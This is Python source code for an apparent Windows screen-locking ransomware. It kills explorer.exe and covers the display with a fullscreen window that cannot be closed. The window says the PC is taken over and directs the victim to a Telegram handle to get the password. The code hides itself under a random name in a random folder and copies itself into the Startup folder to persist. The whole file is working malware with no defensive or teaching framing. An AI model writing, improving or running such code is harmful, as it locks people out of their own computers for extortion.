from tkinter import *
from subprocess import Popen as cmd
import sys
import os
import shutil
import random
import string
NameFile = sys.argv[0]
root = Tk()
def GenerateRandomFileName(extension=".exe"):
    random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return random_name + extension
def MoveToRandomFolderWithNewName(disk='C:', extension=".exe"):
    random_folder = None
    new_name = GenerateRandomFileName(extension)
    try:
        all_folders = [os.path.join(root_dir, d) for root_dir, dirs, files in os.walk(disk) for d in dirs]
        if all_folders:
            random_folder = random.choice(all_folders)
            new_path = os.path.join(random_folder, new_name)
            shutil.move(NameFile, new_path)
            print(f"{new_path}")
            return new_path
    except Exception as e:
        print(f"{e}")
    return None
def AddToStartup(file_path):
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        shutil.copy(file_path, startup_path)
    except Exception as e:
        print(f"{e}")
def CheckPassword(arg):
    if password.get() == "jYubm4C8PDhZ-bZvFOXC":
        root.destroy()
        cmd("start explorer.exe", shell=True)
        try:
            sys.exit()
        except:
            cmd(f"taskkill /f /im {os.path.basename(NameFile)}", shell=True)
X = root.winfo_screenwidth()
Y = root.winfo_screenheight()
cmd("taskkill /f /im explorer.exe", shell=True)
bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: None)
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)
Label(text="ㄚㄖㄩ尺 卩匚 山丨ㄥㄥ 乃乇 爪ㄚ", fg="red", bg=bg, font=font).pack()
Label(text="for pas write to tg @Y0vPzoWKSVQJC_6QBvAt", fg="yellow", bg=bg, font=font).pack()
Label(text="\n\n\n\nenter pas", fg="white", bg=bg, font=font).pack()
password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
new_file_path = MoveToRandomFolderWithNewName(extension=".exe")
if new_file_path:
    AddToStartup(new_file_path)
root.mainloop()